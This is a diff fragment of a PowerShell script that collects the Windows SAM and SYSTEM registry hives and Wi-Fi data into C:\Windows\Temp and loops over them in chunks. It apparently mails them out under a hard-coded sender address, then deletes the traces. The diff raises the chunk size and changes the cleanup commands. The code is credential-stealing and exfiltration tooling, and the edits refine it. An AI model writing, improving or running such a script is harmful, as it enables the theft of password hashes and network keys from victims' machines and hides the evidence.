@@ -47,7 +47,7 @@ $results | Out-File -FilePath "C:\Windows\Temp\wifi.txt" -Encoding utf8
 # $api_key = "..."
 $SENDER  = "qwerkerswim@outlook.com"
 $files   = @("c:\windows\temp\sam.hiv", "c:\windows\temp\system.hiv", "c:\windows\temp\wifi.txt")
-$chunkSize = 1MB
+$chunkSize = 4MB
 
 foreach ($sourcePath in $files) {
     if (!(Test-Path $sourcePath)) { continue } # 沒檔案就跳過
@@ -97,6 +97,5 @@ foreach ($sourcePath in $files) {
 del c:\windows\temp\sam.hiv
 del c:\windows\temp\system.hiv
 del c:\windows\temp\wifi.txt
-del c:\windows\temp\sam.hiv*.dat
-del c:\windows\temp\system.hiv*.dat
-del c:\windows\temp\wifi.txt*.dat
+cd c:\windows\temp
+del *.dat.txt
